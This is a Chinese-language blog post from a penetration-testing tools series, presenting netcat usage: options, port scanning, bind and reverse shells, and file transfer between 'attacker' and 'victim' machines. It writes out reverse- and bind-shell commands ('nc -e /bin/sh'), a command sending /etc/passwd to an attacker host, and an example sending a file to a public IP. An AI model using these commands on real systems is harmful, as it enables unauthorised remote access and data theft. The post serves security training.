---
title: 【渗透神器系列】nc
date: 2017-04-10 10:36:01
comments: true
tags:
- nc
- 渗透神器
categories: 安全工具
permalink: 01
password:
copyright: true
---
<blockquote class="blockquote-center">工欲善其事，必先利其器</blockquote>
　　从事渗透测试工作几年了，在做项目过程中发现良好的渗透技术固然重要，但欲测试出更多的结果，离不开强大的工具。即使是能力超强的大牛，我想也不可能完全手工做渗透，毕竟渗透测试还是个体力活。
　　现在有些人认为渗透测试越来越简单了，因为开源的自动化工具一大推，轮子也是更新换代。即使对安全一窍不通，只要上工具一跑也能获得很多漏洞，甚至自动化获取权限。我必须得承认目前层出不穷的自动化渗透工具已降低了这个行业的入门门槛，但这不意味着渗透测试工作日趋简单。
<!--more -->
　　首先我的理由是安全攻防永远是此消彼长，技术从未停滞过，安全技术永远领先于安全工具，因此只会使用工具，有时会使渗透测试工作很难开展下去，因为防护手段日益更新，而攻击技术却只能依赖滞后的工具，这样的测试效果可见一斑。其次是目前市面上强大的渗透工具，都需要一定的使用基础，绝非傻瓜式的操作，想要用好一款神器，也并非易事。综上所述，我个人认为目前渗透测试工作的难度反而会更大，并且随着国家企业对安全的重视，渗透测试从业者肩上的担子也只会更重。
　　开篇扯了半天蛋无非是想引出本系列的主题——渗透神器，之所以想要介绍记录渗透测试中使用的神器，是因为*工欲善其事，必先利其器*，仅此而已！
　　本篇作为此系列第一篇，将介绍一款渗透界经久不衰的神器，有瑞士军刀美誉的NC。本篇所记内容大部分来自互联网，如觉内容老套可自行绕道，本人尽量全方面记录NC的使用方法，全当个人查询之用，轻喷即可。

### nc Introduce
nc全称netcat,是网络工具中的瑞士军刀，它能通过TCP和UDP在网络中读写数据，功能强大。

### nc Install
linux/mac上默认安装nc，可在命令行下输入nc -h查看。
windows下可下载nc.exe工具使用。

### nc Usage

#### 基本用法
可以输入nc -h查看帮助：
> -h 查看帮助信息 
-d 后台模式 
-g gateway source-routing hop point[s], up to 8
-G num source-routing pointer: 4, 8, 12, ...
-e prog程序重定向，一但连接就执行［危险］ 
-i secs延时的间隔 
-l 监听模式，用于入站连接 
-L 监听模式，连接天闭后仍然继续监听，直到CTR+C 
-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)
-o film记录16进制的传输 
-p[空格]端口 本地端口号 
-s addr 本地源地址
-r 随机本地及远程端口 
-t 使用Telnet交互方式 
-u UDP模式 
-v 详细输出，用-vv将更详细 
-w 数字 timeout延时间隔 
-z 将输入，输出关掉（用于扫锚时）

#### PortScan(端口扫描)
基本tcp扫描：
```bash
nc -vv ip port
例：nc -vv 192.168.1.1 5000 扫描192.168.1.1的tcp 5000端口
```
设置延时，指定端口扫描：
```bash
nc -vv -w secs ip port-port
例：nc -vv -w 5 192.168.1.1 5000-5002 扫描192.168.1.1的5000-5002端口，网络超时的时间设为5秒。
```
#### 建立连接
##### 正向连接
目标监听一个端口：
```bash
nc -l -p port -e cmd.exe //windows
nc -l -p port -e /bin/sh //linux
```
本机去连接此端口：
```bash
nc ip port 
```
##### 反向链接
本机监听一个端口：
```bash
nc -vv -l -p port
```
目标连接此端口：
```bash
nc -e cmd.exe ip port //windows
nc -e /bin/sh ip port //linux
```
#### 传送文件
##### 目标机上下载文件
```bash
victim machine:
nc attack_ip port <  /etc/passwd
attacker machine:
nc -d -l -p  port  >  tmp
```
实例：
本机作为目标机，因为是内网ip，模拟现实情况，113.214.238.185为攻击机，现在就是要从目标机上下载文件到攻击机上。
目标机：nc.exe 113.214.238.185 9999 < H:\test.txt 将目标机H盘下test.txt文件传输到攻击机9999端口上
攻击机：nc.exe -d -l -p 9999 > test.txt 将本机9999端口传输过来的文件重命名为test.txt

##### 上传文件至目标机
```bash
attacker machine:
nc -d -l -p port < tmp
victim machine:
nc attack_ip port > tmp
```
实例：
攻击机：nc -d -l -p 9990 < test2.txt
目标机：nc 113.214.238.185 9990 > test2.txt

#### 端口数据抓包
```bash
nc -vv -w 2 -o test.txt thief.one 80 21-15
```
#### 自定义
配合|<等命令，可无限放大NC的功能。

##### 加密传输的数据
服务端：$nc localhost 1567 | mcrypt –flush –bare -F -q -d -m ecb > file.txt
客户端：$mcrypt –flush –bare -F -q -m ecb < file.txt | nc -l 1567

##### 目录传输
目标机：$tar -cvf – dir_name | nc -l 1567
攻击机：$nc -n 10.0.0.2 1567 | tar -xvf -

##### 命令记录
```bash
nc -vv victim_ip port < path\file.cmd
```
##### 搭建蜜罐
* nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 
* nc -L -p 80 > c:\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\log.txt 
* nc -L -p 80 < c:\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中，亦可起到传送文件作用 
* type.exe c:\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\honeyport.txt中内容送入管道中,亦可起到传送文件作用 

### 类nc工具
* ncat 安装nmap后默认安装ncat，用法于nc类似。
* [Pyshell](http://thief.one/2016/09/05/PyShell-%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8/) 致敬nc的一款后门shell工具。

### 传送门
[【渗透神器系列】Metasploit](http://thief.one/2017/08/01/1/)
[【渗透神器系列】DNS信息查询](http://thief.one/2017/07/12/1/)
[【渗透神器系列】Fiddler](http://thief.one/2017/04/27/1)
[【渗透神器系列】nmap](http://thief.one/2017/05/02/1/)
[【渗透神器系列】搜索引擎](http://thief.one/2017/05/19/1)
[【渗透神器系列】WireShark](http://thief.one/2017/02/09/WireShark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/)


参考文章：
https://www.oschina.net/translate/linux-netcat-command
http://www.w3cschool.cn/dosmlxxsc1/jiszug.html






